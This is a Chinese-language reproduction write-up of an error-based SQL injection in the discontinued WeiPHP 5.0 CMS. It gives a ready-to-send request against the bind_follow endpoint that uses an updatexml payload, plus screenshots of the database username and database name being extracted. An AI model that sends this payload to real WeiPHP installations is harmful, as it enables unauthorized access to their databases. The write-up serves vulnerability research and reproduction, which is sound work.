# WeiPHP5.0 SQL注入漏洞2

本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。

## 漏洞描述

`WeiPHP5.0`是在2019年停止更新的一个系统，漏洞挺多的，跟着复现分析一下，前面分析了一处由于拼接造成的注入，这里复现一下 `WeiPHP5.0`的另一个`SQL`注入漏洞

## 漏洞影响

`WeiPHP5.0`最新版

可以据此下载

https://www.weiphp.cn/doc/download_source_installation.html

## 漏洞复现

访问如下链接并抓包

```php
/index.php/home/Index/bind_follow
publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5(%271%27),0x7e),1)--+
```

`post`或者 `get`都可以，这里开了调试模式，因此可以使用报错注入

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1651839360763-e1b05583-a112-4ff3-bf03-6e571b9450f5.png)

爆用户名

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1651839676508-25cdbda5-2cad-4080-b45f-9e94302caf65.png)

爆数据库

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1651839709664-0e27aa69-95a8-467c-91c4-7aeae4325a1c.png)

## 总结

之前对于 `thinkphp`开发的系统很少去弄 `SQL`相关的分析，因为觉得 `thinkphp`可能做得比较完美了，但经过这一次的分析，觉得还是很有开发的潜力。

## 参考链接

- `http://wiki.peiqi.tech/wiki/cms/WeiPHP/WeiPHP5.0%20bind_follow%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html`



`github` 链接：`https://github.com/N0puple/vulPOC`

想要获取更多资讯，或者获取文中环境可以关注公众号 “安全漏洞复现”，回复 “漏洞环境”

